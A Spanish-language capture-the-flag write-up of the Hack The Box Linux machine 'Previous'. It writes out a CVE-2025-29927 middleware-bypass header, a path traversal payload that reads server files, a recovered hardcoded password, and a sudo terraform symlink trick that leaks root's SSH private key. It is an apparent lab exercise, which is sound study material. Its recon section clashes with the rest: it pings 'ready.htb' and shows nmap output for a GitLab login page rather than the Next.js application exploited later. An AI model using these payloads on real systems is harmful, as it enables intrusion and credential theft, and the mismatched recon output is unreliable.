# Previous
## 1. Introducción
### 1.1 Antecedentes
**Previous** es una máquina Linux de dificultad <i>Medium</i> de Hack The Box que combina vulnerabilidades modernas en aplicaciones **Nex<span style="color:rgb(239, 198, 78)"></span>t.js**, bypass de autenticación mediante un CVE reciente, lectura arbitraria de archivos y una escalada de privilegios basada en una mala configuración de **Terraform**.
### 1.2 Objetivos
## 2. Enumeración
### 2.1 Reconocimiento inicial
Comenzamos verificando conectividad:
```bash
❯ ping -c1 ready.htb
```
El host responde correctamente, confirmando que está activo.
### 2.2 Nmap
Realizamos un escaneo completo de puertos:
```bash
❯ sudo nmap -p- -Pn -sS -n --min-rate 5000 10.129.227.132 -oN allports --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-22 09:20 CST
Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 09:20 (0:00:00 remaining)
Nmap scan report for 10.129.227.132
Host is up (0.32s latency).
Not shown: 33428 closed tcp ports (reset), 32105 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
5080/tcp open  onscreen
```
Puertos abiertos detectados:

Procedemos con un escaneo más detallado:
```bash
❯ nmap -p22,5080 -sCV -Pn -oN targeted 10.129.227.132
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-22 09:24 CST
Nmap scan report for 10.129.227.132
Host is up (0.084s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.129.227.132:5080/users/sign_in
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Resultados relevantes:

### 2.3 Análisis de la Aplicación Web
Mediante Wappalyzer se identifica que la aplicación está desarrollada con:

<img width="1012" height="581" alt="image" src="https://github.com/user-attachments/assets/45092361-92dd-46b6-b7d6-1c56fc0c302e" />
- **Next.js 15.2.2**

Investigando esta versión se encuentra información sobre:
#### CVE-2025-29927
Esta vulnerabilidad permite un **bypass de autorización en middleware** mediante la manipulación del header:
```
x-middleware-subrequest
```
## 3. Explotación 
### 3.1 Bypass de Autenticación
Interceptamos la autenticación con **Burp Suite** y, en lugar de modificar cada petición manualmente, configuramos una regla en **Proxy → Match and Replace** para que Burp añadiera automáticamente el header:
```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```
Con el header aplicado en todas las solicitudes, el middleware fue bypassed y obtuvimos acceso no autorizado a:
```
/docs
```
Luego accedemos a:
```
http://previous.htb/docs/examples
```
Se muestra un ejemplo descargable:
<img width="1227" height="274" alt="image" src="https://github.com/user-attachments/assets/5a7c7171-172d-4053-bc3e-6783b45dde1a" />
Descargable desde:
```
/api/download?example=hello-world.ts
```
### 3.2 Local File Read (Path Traversal)
Interceptamos la petición:
```
GET /api/download?example=hello-world.ts
```
Modificamos el parámetro `example` para intentar un Path Traversal:
```
/api/download?example=./../../../proc/self/cwd/package.json
```
La respuesta devuelve exitosamente el archivo `package.json`, confirmando una **vulnerabilidad de lectura arbitraria de archivos**.
Contenido relevante:
```JSON
"dependencies": {  
"next": "^15.2.2",  
"next-auth": "^4.24.11"  
}
```
### 3.2 Enumeración Interna del Proyecto
Aprovechando la lectura arbitraria, accedemos a:
```
../../../../proc/self/cwd/.next/routes-manifest.json
```
Descubrimos el endpoint:
```
/api/auth/[...nextauth]
```
Luego accedemos al archivo compilado:
```
../../../../proc/self/cwd/.next/server/pages/api/auth/[...nextauth].js
```
Al revisar el código fuente transpilado encontramos la lógica de autenticación:
```Javascript
e?.username === "jeremy" &&  
e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")
```
Esto revela que el usuario válido es **jeremy** y que, si la variable de entorno `ADMIN_SECRET` no está definida, el sistema utiliza como contraseña por defecto:
```
MyNameIsJeremyAndILovePancakes
```
Dado que el valor está hardcodeado como fallback, pudimos utilizar directamente esas credenciales para autenticarnos y obtener acceso inicial al sistema vía SSH.
## 4. Escalada de Privilegios
Revisamos permisos sudo:
```bash
❯ sudo -l
```
Salida relevante:
```
User jeremy may run the following commands:  
(root) /usr/bin/terraform -chdir=/opt/examples apply
```
Observamos también el archivo:
```
.terraformrc
```
Contenido:
```
provider_installation {  
  dev_overrides {  
    "previous.htb/terraform/examples" = "/usr/local/go/bin"  
  }  
  direct {}  
}
```
Esto sugiere que Terraform puede cargar recursos desde rutas controlables.
### 4.1 Explotación mediante Symlink
Creamos la siguiente estructura:
```bash
❯ mkdir -p /tmp/root/examples  
❯ cd /tmp/root/examples  
❯ ln -s /root/.ssh/id_rsa pwn
```
Luego ejecutamos:
```bash
❯ TF_VAR_source_path=/tmp/root/examples/pwn sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform procesa el recurso y termina mostrando el contenido del archivo enlazado simbólicamente:
```
/root/.ssh/id_rsa
```
### 4.2 Acceso Root
Guardamos la clave:
```bash
❯ chmod 600 id_rsa
```
Conectamos:
```bash
❯ ssh -i id_rsa root@previous.htb
```
Verificación:
```bash
❯ whoami
root
```

